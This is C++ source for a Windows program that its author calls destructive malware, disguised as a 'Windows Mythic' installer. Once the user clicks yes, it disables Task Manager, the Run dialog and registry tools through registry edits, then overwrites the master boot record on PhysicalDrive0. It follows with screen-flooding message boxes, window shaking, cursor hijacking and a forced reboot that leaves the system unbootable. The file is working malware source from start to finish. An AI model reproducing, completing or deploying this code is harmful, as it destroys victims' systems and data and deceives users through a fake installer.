#include <windows.h>
#include <ctime>
#include "MBRheader.h"
// my second destructive malware

;VOID WINAPI closeB(HANDLE winhnd) {
	TerminateThread(winhnd, 0);
	CloseHandle(winhnd);
}

VOID WINAPI disable() {
	system("taskkill /f /im taskmgr.exe");
	system("taskkill /f /im regedit.exe");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableRegistryTools /t reg_dword /d 1 /f");
}

DWORD WINAPI msgbox(LPVOID msg) {
	while (1) {
		MessageBoxA(NULL, "Installing Windows Mythic...", "Windows Mythic Setup", 4096 | 1 | 64);
	}
}

VOID WINAPI Restart() {
	system("shutdown -r -t 0");
}

BOOL CALLBACK EnumProc(HWND hWnd, LPARAM lParam) {
    ShowWindow(hWnd, 5);
    return 1;
}

DWORD WINAPI child(LPVOID lpcld)
{
   while (1) {
      EnumChildWindows(GetDesktopWindow(), EnumProc, 0);
      Sleep(1);
    }
}

DWORD WINAPI msg(LPVOID lpmsg) {
	while (1) {
		MessageBoxA(NULL, NULL, "NULL", 2 | 16 | MB_RTLREADING);
	}
}

VOID WINAPI trashmbr() {
	DWORD dwBytesWritten;
	HANDLE hdv = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hdv, MasterBootRecord, 512, &dwBytesWritten, 0);
}

DWORD WINAPI shake(LPVOID lpshk)
{
	int R = 10;
	int PO = 0; 
	srand((unsigned)time(NULL));
	while (true) {
	RECT rt;
	HWND up = GetForegroundWindow(); 
	GetWindowRect(up,&rt);
	PO = rand() % 4 + 1;
	if (PO == 4)
	SetWindowPos(up,0,rt.left + R, rt.top, rand () % 100, 100, SWP_NOSIZE);
	if (PO == 3)
	SetWindowPos(up,0,rt.left - R, rt.top, 100, 100, SWP_NOSIZE);
	if (PO == 2)
	SetWindowPos(up,0,rt.left, rt.top + R, rand () % 100, 100, SWP_NOSIZE);
	if (PO == 1)
	SetWindowPos(up,0,rt.left, rt.top - R, 100, 100, SWP_NOSIZE);
	Sleep(rand() % 90 + 10);
}
}

DWORD WINAPI cursormove(LPVOID lpcr)
{
	POINT cursor;
	while (1) {
		GetCursorPos(&cursor);
		int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
		SetCursorPos(rand () % sw, rand () % sh);
		Sleep(10);
	}

}

int main () {
	HWND hWnd = GetDesktopWindow();
	if (MessageBoxA(hWnd, "Welcome to Windows Mythic Installer!\r\nSetup will install Windows Mythic on your computer.\r\nTo you want to continue?", "Windows Mythic Installer", 4096 | 4 | 64) == IDNO)
	{
		MessageBoxA(hWnd, "Cancelling Setup...", "Windows Mythic Installer", 4096 | 0 | 64);
		Sleep(500);
		ExitProcess(0);
	}
	else
	{
		Sleep(1000);
		HANDLE bruh = CreateThread(0, 0, msgbox, 0, 0, 0);
		Sleep(5000);
		closeB(bruh);
		Sleep(1000);
		disable();
		trashmbr();
		HANDLE object = CreateThread(0, 0, msg, 0, 0, 0);
		Sleep(1000);
		HANDLE chld = CreateThread(0, 0, child, 0, 0, 0);
		PlaySoundA("SystemHand", NULL, SND_LOOP | SND_ALIAS | SND_ASYNC);
		Sleep(5000);
		HANDLE shaking = CreateThread(0, 0, shake, 0, 0, 0);
		HANDLE movement = CreateThread(0, 0, cursormove, 0, 0, 0);
		Sleep(25000);
		Restart();
	}
}
